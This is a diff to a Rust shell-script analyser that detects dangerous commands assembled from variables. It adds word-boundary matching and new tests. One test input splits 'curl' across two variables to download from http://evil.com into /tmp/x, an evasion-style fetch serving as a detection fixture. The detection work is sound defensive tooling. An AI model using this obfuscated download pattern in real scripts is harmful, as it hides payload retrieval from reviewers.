@@ -200,13 +200,49 @@ fn contains_dangerous_pipe(resolved: &str) -> Option<(&'static str, &'static str
     None
 }
 
-/// Check if a resolved line contains any dangerous command not present in the original.
-fn contains_new_dangerous_cmd(original: &str, resolved: &str) -> Option<&'static str> {
+/// Whether a byte is a shell word character (alphanumeric or underscore).
+fn is_word_char(b: u8) -> bool {
+    b.is_ascii_alphanumeric() || b == b'_'
+}
+
+/// Check if `word` appears in `text` at a word boundary (not as a substring of a larger token).
+fn has_word_match(text: &str, word: &str) -> bool {
+    let mut start = 0;
+    while let Some(pos) = text[start..].find(word) {
+        let abs_pos = start + pos;
+        let before_ok = abs_pos == 0 || !is_word_char(text.as_bytes()[abs_pos - 1]);
+        let end_pos = abs_pos + word.len();
+        let after_ok = end_pos >= text.len() || !is_word_char(text.as_bytes()[end_pos]);
+        if before_ok && after_ok {
+            return true;
+        }
+        start = abs_pos + 1;
+    }
+    false
+}
+
+/// Check if a resolved line contains a dangerous command assembled from multiple variables.
+/// Returns None if a single variable already holds the command (SA-INDIRECT-EXEC covers that).
+fn contains_multi_var_dangerous_cmd(
+    original: &str,
+    resolved: &str,
+    env: &HashMap<String, String>,
+) -> Option<&'static str> {
     let orig_lower = original.to_lowercase();
     let res_lower = resolved.to_lowercase();
     DANGEROUS_COMMANDS
         .iter()
-        .find(|&&cmd| res_lower.contains(cmd) && !orig_lower.contains(cmd))
+        .find(|&&cmd| {
+            if !has_word_match(&res_lower, cmd) || has_word_match(&orig_lower, cmd) {
+                return false;
+            }
+            // Skip if any single variable already holds this command —
+            // SA-INDIRECT-EXEC handles that case with execution-position checking.
+            let single_var_holds_it = env
+                .values()
+                .any(|v| has_word_match(&v.to_lowercase(), cmd));
+            !single_var_holds_it
+        })
         .copied()
 }
 
@@ -259,7 +295,7 @@ fn analyze_variable_resolution(
 
         // Check for dangerous command appearing after resolution
         if !found_cmd
-            && let Some(cmd) = contains_new_dangerous_cmd(line, &resolved)
+            && let Some(cmd) = contains_multi_var_dangerous_cmd(line, &resolved, env)
         {
             signals.push(Signal {
                 id: "SA-VAR-CONCAT-CMD".to_string(),
@@ -573,6 +609,34 @@ mod tests {
         let ids = analyze("prefix=/usr\ninstall -Dm755 binary ${prefix}/bin/tool");
         assert!(!has(&ids, "SA-VAR-CONCAT-EXEC"));
         assert!(!has(&ids, "SA-VAR-CONCAT-CMD"));
+    }
+
+    #[test]
+    fn var_concat_single_var_python_no_signal() {
+        // Single variable holding "python3" should NOT fire SA-VAR-CONCAT-CMD
+        // (SA-INDIRECT-EXEC handles single-variable cases)
+        let ids = analyze("_py=python3\n$_py setup.py install");
+        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"), "single var python3 should not fire, got: {ids:?}");
+    }
+
+    #[test]
+    fn var_concat_single_var_sh_no_signal() {
+        let ids = analyze("_shell=sh\n$_shell -c 'echo hello'");
+        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"), "single var sh should not fire, got: {ids:?}");
+    }
+
+    #[test]
+    fn var_concat_multi_var_still_fires() {
+        // Multi-variable concatenation SHOULD still fire
+        let ids = analyze("a=cu\nb=rl\n$a$b http://evil.com -O /tmp/x");
+        assert!(has(&ids, "SA-VAR-CONCAT-CMD"), "multi-var concat should fire, got: {ids:?}");
+    }
+
+    #[test]
+    fn var_concat_word_boundary_no_substring() {
+        // "_fisher=fisher" should NOT match "sh" as a substring
+        let ids = analyze("_fisher=fisher\necho $_fisher");
+        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"), "fisher should not match sh, got: {ids:?}");
     }
 
     #[test]
